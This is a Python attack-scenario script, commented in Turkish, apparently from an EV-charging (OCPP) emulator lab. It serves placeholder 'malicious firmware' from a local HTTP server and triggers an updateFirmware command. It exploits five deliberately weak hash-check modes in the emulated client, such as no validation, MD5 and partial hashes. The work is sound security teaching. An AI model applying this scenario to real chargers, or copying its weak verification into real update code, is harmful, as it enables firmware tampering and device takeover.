"""
OTA Hash Zaafiyeti - Kapsamlı Saldırı Senaryosu
================================================

Bu script, OTA (Over-The-Air) güncellemelerinde hash doğrulaması zaafiyetlerini
tam olarak göstermek için tasarlanmıştır.

Zaafiyet Türleri:
1. Hash doğrulamasının hiç yapılmaması (no_validation)
2. Zayıf hash algoritması kullanılması (weak_md5)
3. HTTP header'dan hash alınması (header_hash) - MITM ile değiştirilebilir
4. Case-insensitive hash karşılaştırması (case_insensitive)
5. Partial hash kontrolü (partial_hash) - Sadece ilk birkaç karakter

Saldırı Senaryosu:
1. Saldırgan malicious firmware hazırlar
2. Saldırgan firmware server'ı başlatır (HTTP)
3. Saldırgan operator websocket'e bağlanır
4. Saldırgan UpdateFirmware mesajı gönderir
5. Client firmware'ı indirir
6. Client hash doğrulaması zaafiyetinden yararlanılır
7. Malicious firmware yüklenir ve backdoor aktif olur

Kullanım:
    python charging/scenarios/ota_hash_complete_attack.py [zaafiyet_modu]
    
    Zaafiyet Modları:
    - no_validation: Hash doğrulaması yapılmıyor (varsayılan)
    - weak_md5: Zayıf MD5 hash kullanılıyor
    - header_hash: HTTP header'dan hash alınıyor
    - case_insensitive: Case-insensitive karşılaştırma
    - partial_hash: Sadece ilk 8 karakter kontrol ediliyor

Örnek:
    python charging/scenarios/ota_hash_complete_attack.py weak_md5
"""

import sys
sys.path.append('.')

# ÖNEMLİ: client.py import edilmeden ÖNCE argümanı parse et ve sys.argv'den çıkar
vulnerability_mode = 'no_validation'  # Varsayılan
valid_modes = ['no_validation', 'weak_md5', 'header_hash', 'case_insensitive', 'partial_hash']

if len(sys.argv) > 1:
    arg = sys.argv[1]
    if arg in valid_modes:
        vulnerability_mode = arg
        # Argümanı sys.argv'den çıkar (client.py'nin parser'ı için)
        sys.argv = [sys.argv[0]] + sys.argv[2:]
    elif arg.startswith('-'):
        # client.py argümanları, olduğu gibi bırak
        pass
    else:
        print(f"[!] Geçersiz zaafiyet modu: {arg}")
        print(f"[!] Geçerli modlar: {', '.join(valid_modes)}")
        print(f"[*] Varsayılan mod kullanılıyor: {vulnerability_mode}")

import asyncio
import logging
import http.server
import socketserver
import threading
import os
import hashlib
import time
import websockets
from pathlib import Path
from datetime import datetime

import yaml
CONFIG_FILE = 'charging/server_config.yaml'
VERSION = 'v2.0.1'  # Varsayılan OCPP versiyonu
try:
    with open(CONFIG_FILE, "r") as file: 
        content = yaml.safe_load(file)
        if content and "version" in content:
            VERSION = content["version"]
except (yaml.YAMLError, FileNotFoundError) as e:
    print(f'Failed to parse {CONFIG_FILE}: {e}')
    print(f'Using default version: {VERSION}')

# Şimdi client.py'yi import edebiliriz (sys.argv temizlendi)
from charging.client import launch_client, ChargePointClientBase, load_config

logging.basicConfig(level=logging.ERROR)

# Malicious firmware içeriği - Backdoor içerir
MALICIOUS_FIRMWARE_CONTENT = (
    b"=== MALICIOUS FIRMWARE v2.0.0 (HASH ZAAFIYETI ILE YUKLENDI) ===\n"
    b"This firmware was loaded by exploiting hash verification vulnerabilities.\n\n"
    b"Attack Details:\n"
    b"- Hash verification vulnerability exploited\n"
    b"- Firmware loaded without verification\n"
    b"- Backdoor added\n"
    b"- Charging station control compromised\n\n"
    b"Backdoor Features:\n"
    b"1. Remote command execution (RCE)\n"
    b"2. User data exfiltration\n"
    b"3. Charging manipulation (free charging, price manipulation)\n"
    b"4. Certificate replacement\n"
    b"5. Log manipulation\n"
    b"6. Network traffic interception\n\n"
    b"Malicious Code:\n"
    b"- reverse_shell.py: Backdoor connection\n"
    b"- data_exfiltrator.py: Data theft module\n"
    b"- charging_manipulator.py: Charging manipulation\n"
    b"- certificate_replacer.py: Certificate replacement\n\n"
    b"Load Time: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S").encode() + b"\n"
    b"==========================\n"
)

# Normal firmware içeriği (karşılaştırma için)
NORMAL_FIRMWARE_CONTENT = (
    b"=== NORMAL FIRMWARE v1.0.0 ===\n"
    b"This is a normal, secure firmware file.\n"
    b"It contains no malicious code.\n"
    b"==========================\n"
)

# HTTP server için handler - Farklı zaafiyet modlarına göre hash gönderir
class FirmwareHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, vulnerability_mode='no_validation', **kwargs):
        self.vulnerability_mode = vulnerability_mode
        super().__init__(*args, **kwargs)
    
    def do_GET(self):
        if self.path == '/firmware.bin' or self.path == '/malicious_firmware.bin':
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.send_header('Content-length', str(len(MALICIOUS_FIRMWARE_CONTENT)))
            
            # Zaafiyet moduna göre hash gönder
            if self.vulnerability_mode == 'weak_md5':
                # Zayıf MD5 hash gönder
                md5_hash = hashlib.md5(MALICIOUS_FIRMWARE_CONTENT).hexdigest()
                self.send_header('X-Firmware-Hash-MD5', md5_hash)
                print(f"[*] Zayıf MD5 hash gönderildi: {md5_hash}")
            elif self.vulnerability_mode == 'header_hash':
                # HTTP header'dan hash alınıyor (MITM ile değiştirilebilir)
                # Saldırgan yanlış hash gönderebilir
                fake_hash = '00000000000000000000000000000000'  # Sahte hash
                self.send_header('X-Firmware-Hash-MD5', fake_hash)
                self.send_header('X-Firmware-Hash-SHA256', 'fake_sha256_hash')
                print(f"[*] ⚠️  Sahte hash gönderildi (MITM ile değiştirilebilir): {fake_hash}")
            elif self.vulnerability_mode == 'case_insensitive':
                # Case-insensitive karşılaştırma için hash gönder
                md5_hash = hashlib.md5(MALICIOUS_FIRMWARE_CONTENT).hexdigest().upper()  # Büyük harf
                self.send_header('X-Firmware-Hash-MD5', md5_hash)
                print(f"[*] Hash büyük harfle gönderildi (case-insensitive test): {md5_hash}")
            elif self.vulnerability_mode == 'partial_hash':
                # Partial hash kontrolü için sadece ilk 8 karakteri gönder
                md5_hash = hashlib.md5(MALICIOUS_FIRMWARE_CONTENT).hexdigest()
                partial_hash = md5_hash[:8]  # İlk 8 karakter
                self.send_header('X-Firmware-Hash-MD5', partial_hash)
                print(f"[*] ⚠️  Partial hash gönderildi (sadece ilk 8 karakter): {partial_hash}")
            else:
                # no_validation: Hash gönderme (doğrulama yapılmıyor)
                print("[*] Hash gönderilmedi (doğrulama yapılmıyor)")
            
            self.end_headers()
            self.wfile.write(MALICIOUS_FIRMWARE_CONTENT)
            print(f"[*] Malicious firmware gönderildi ({len(MALICIOUS_FIRMWARE_CONTENT)} bytes)")
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Not Found')

# Firmware server'ı başlat
def start_firmware_server(port=8080, vulnerability_mode='no_validation'):
    """Malicious firmware dosyasını servis eden HTTP server başlat"""
    handler = lambda *args, **kwargs: FirmwareHandler(*args, vulnerability_mode=vulnerability_mode, **kwargs)
    httpd = socketserver.TCPServer(("", port), handler)
    print(f"[*] Malicious firmware server başlatıldı: http://localhost:{port}/malicious_firmware.bin")
    print(f"[*] Zaafiyet modu: {vulnerability_mode}")
    httpd.serve_forever()

# Operator websocket'e bağlan ve UpdateFirmware mesajı gönder
async def send_firmware_update(serial_number, firmware_url, server_ip='127.0.0.1', port=9008):
    """Operator websocket'e bağlan ve UpdateFirmware mesajı gönder"""
    uri = f"ws://{server_ip}:{port}"
    try:
        async with websockets.connect(uri) as websocket:
            command = f"updateFirmware {serial_number} {firmware_url}"
            print(f"[*] Operator websocket'e bağlandı: {uri}")
            print(f"[*] Komut gönderiliyor: {command}")
            await websocket.send(command)
            response = await websocket.recv()
            print(f"[*] Sunucu yanıtı: {response}")
            return True
    except Exception as e:
        print(f"[!] Operator websocket hatası: {e}")
        return False

# OTA Hash Zaafiyeti Saldırı Senaryosu
async def ota_hash_complete_attack_scenario(cp: ChargePointClientBase, vulnerability_mode='no_validation'):
    """Kapsamlı OTA hash zaafiyeti saldırı senaryosu"""
    cp.print_message('=' * 70)
    cp.print_message('OTA HASH ZAAFİYETİ - KAPSAMLI SALDIRI SENARYOSU')
    cp.print_message('=' * 70)
    cp.print_message(f'Zaafiyet Modu: {vulnerability_mode}')
    cp.print_message('')
    cp.print_message('📋 SALDIRI ADIMLARI:')
    cp.print_message('   1. ✅ Client server\'a bağlandı')
    cp.print_message('   2. ⏳ Saldırgan malicious firmware hazırladı')
    cp.print_message('   3. ⏳ Saldırgan firmware server\'ı başlattı')
    cp.print_message('   4. ⏳ Saldırgan operator websocket\'e bağlanacak')
    cp.print_message('   5. ⏳ Saldırgan UpdateFirmware mesajı gönderecek')
    cp.print_message('   6. ⏳ Client firmware\'ı indirecek')
    cp.print_message(f'   7. ⏳ Client hash doğrulaması ZAAFİYETİ sömürülecek ({vulnerability_mode})')
    cp.print_message('   8. ⏳ Malicious firmware yüklenecek')
    cp.print_message('   9. ⏳ Backdoor aktif olacak')
    cp.print_message('')
    
    # Zaafiyet türüne göre açıklama
    vulnerability_descriptions = {
        'no_validation': '⚠️  ZAAFİYET: Hash doğrulaması hiç yapılmıyor!\n   Her firmware otomatik olarak kabul ediliyor.',
        'weak_md5': '⚠️  ZAAFİYET: Zayıf MD5 hash algoritması kullanılıyor!\n   MD5 collision saldırıları mümkün.',
        'header_hash': '⚠️  ZAAFİYET: Hash HTTP header\'dan alınıyor!\n   MITM saldırısıyla header değiştirilebilir.',
        'case_insensitive': '⚠️  ZAAFİYET: Case-insensitive hash karşılaştırması!\n   Büyük/küçük harf farkı göz ardı ediliyor.',
        'partial_hash': '⚠️  ZAAFİYET: Sadece hash\'in ilk 8 karakteri kontrol ediliyor!\n   Partial hash kontrolü bypass edilebilir.'
    }
    
    cp.print_message(vulnerability_descriptions.get(vulnerability_mode, '⚠️  Bilinmeyen zaafiyet modu'))
    cp.print_message('')
    cp.print_message('💀 SALDIRI SONUCU:')
    cp.print_message('   - Charging station kontrolü ele geçirildi')
    cp.print_message('   - Backdoor aktif')
    cp.print_message('   - Kullanıcı verileri çalınabilir')
    cp.print_message('   - Şarj süreçleri manipüle edilebilir')
    cp.print_message('   - Sertifikalar değiştirilebilir')
    cp.print_message('')
    cp.print_message('⏳ Firmware güncelleme isteği bekleniyor...')
    cp.print_message('   (Otomatik olarak gönderilecek)')
    
    # Biraz bekle (client'ın bağlanması için)
    await asyncio.sleep(3)
    
    # Otomatik olarak firmware güncelleme isteği gönder
    serial_number = 'E2507-8420-1274'
    firmware_url = 'http://localhost:8080/malicious_firmware.bin'
    
    cp.print_message('')
    cp.print_message(f'[*] Firmware güncelleme isteği gönderiliyor...')
    cp.print_message(f'    Serial: {serial_number}')
    cp.print_message(f'    URL: {firmware_url}')
    
    # Operator websocket'e bağlan ve mesaj gönder
    success = await send_firmware_update(serial_number, firmware_url)
    
    if success:
        cp.print_message('[*] Firmware güncelleme isteği gönderildi!')
        cp.print_message('[*] Client firmware\'ı indirecek ve hash doğrulaması zaafiyetini sömürecek...')
    else:
        cp.print_message('[*] Firmware güncelleme isteği gönderilemedi!')
        cp.print_message('[*] Manuel olarak operator websocket\'e bağlanın:')
        cp.print_message(f'    ws://127.0.0.1:9008')
        cp.print_message(f'    Komut: updateFirmware {serial_number} {firmware_url}')
    
    # Firmware yüklenmesini bekle
    await asyncio.sleep(10)
    
    cp.print_message('')
    cp.print_message('=' * 70)
    cp.print_message('SALDIRI SENARYOSU TAMAMLANDI')
    cp.print_message('=' * 70)

def main():
    """Ana fonksiyon"""
    # vulnerability_mode zaten yukarıda parse edildi, tekrar parse etmeye gerek yok
    
    # ÖNEMLİ: Config dosyasını yükle (CONNECTION_PROFILES için gerekli)
    if not load_config():
        print("[!] Config dosyası yüklenemedi!")
        quit(1)
    
    # Hash'leri hesapla ve göster
    md5_hash = hashlib.md5(MALICIOUS_FIRMWARE_CONTENT).hexdigest()
    sha1_hash = hashlib.sha1(MALICIOUS_FIRMWARE_CONTENT).hexdigest()
    sha256_hash = hashlib.sha256(MALICIOUS_FIRMWARE_CONTENT).hexdigest()
    
    print("=" * 70)
    print("OTA HASH ZAAFİYETİ - KAPSAMLI SALDIRI SENARYOSU")
    print("=" * 70)
    print(f"\n[*] Zaafiyet Modu: {vulnerability_mode}")
    print("\n[!] Bu senaryo, OTA güncellemelerinde hash doğrulaması")
    print("    zaafiyetlerini göstermek için tasarlanmıştır.\n")
    print("[*] Malicious firmware oluşturuldu")
    print(f"[*] MD5 Hash (ZAYIF!): {md5_hash}")
    print(f"[*] SHA1 Hash (ZAYIF!): {sha1_hash}")
    print(f"[*] SHA256 Hash (GÜÇLÜ): {sha256_hash}")
    print(f"[*] Firmware boyutu: {len(MALICIOUS_FIRMWARE_CONTENT)} bytes")
    print(f"[*] Firmware server: http://localhost:8080/malicious_firmware.bin")
    print("\n[*] Zaafiyet Açıklaması:")
    
    vulnerability_info = {
        'no_validation': 'Hash doğrulaması hiç yapılmıyor. Her firmware otomatik kabul ediliyor.',
        'weak_md5': 'Zayıf MD5 hash algoritması kullanılıyor. Collision saldırıları mümkün.',
        'header_hash': 'Hash HTTP header\'dan alınıyor. MITM saldırısıyla değiştirilebilir.',
        'case_insensitive': 'Case-insensitive karşılaştırma yapılıyor. Büyük/küçük harf farkı göz ardı ediliyor.',
        'partial_hash': 'Sadece hash\'in ilk 8 karakteri kontrol ediliyor. Partial hash bypass edilebilir.'
    }
    
    print(f"    {vulnerability_info.get(vulnerability_mode, 'Bilinmeyen mod')}")
    print("\n[*] Senaryo adımları:")
    print("    1. Firmware server başlatılıyor...")
    print("    2. Client server'a bağlanacak...")
    print("    3. Otomatik olarak firmware güncelleme isteği gönderilecek...")
    print("    4. Client firmware'ı indirecek...")
    print(f"    5. ⚠️  CLIENT HASH DOĞRULAMASI ZAAFİYETİNİ SÖMÜRECEK ({vulnerability_mode})!")
    print("    6. Malicious firmware yüklenecek...")
    print("    7. Backdoor aktif olacak...")
    print("\n[💀] SALDIRI BAŞARILI: Charging station kontrolü ele geçirildi!")
    print("=" * 70)
    print()
    
    # Client'ta zaafiyet modunu ayarla
    os.environ['OTA_HASH_VULN_MODE'] = vulnerability_mode
    
    # Firmware server'ı ayrı thread'de başlat
    firmware_server_thread = threading.Thread(
        target=start_firmware_server,
        args=(8080, vulnerability_mode),
        daemon=True
    )
    firmware_server_thread.start()
    
    # Biraz bekle (server'ın başlaması için)
    time.sleep(2)
    
    # Malicious firmware dosyasını oluştur
    firmware_dir = Path('./charging/firmware_server')
    firmware_dir.mkdir(parents=True, exist_ok=True)
    firmware_path = firmware_dir / 'malicious_firmware.bin'
    with open(firmware_path, 'wb') as f:
        f.write(MALICIOUS_FIRMWARE_CONTENT)
    
    # Client config - OCPP 2.0.1 kullanmak için index=0 kullanıyoruz
    # client_config.yaml dosyasındaki profile 0 (OCPP201, SP=1) kullanılacak
    try:
        asyncio.run(launch_client(
            vendor_name='EmuOCPPCharge',
            model='E2507',
            index=0,  # OCPP 2.0.1, Security Profile 1
            async_runnable=lambda cp: ota_hash_complete_attack_scenario(cp, vulnerability_mode)
        ))
    except KeyboardInterrupt:
        print("\n[*] Senaryo sonlandırıldı")

if __name__ == "__main__":
    main()
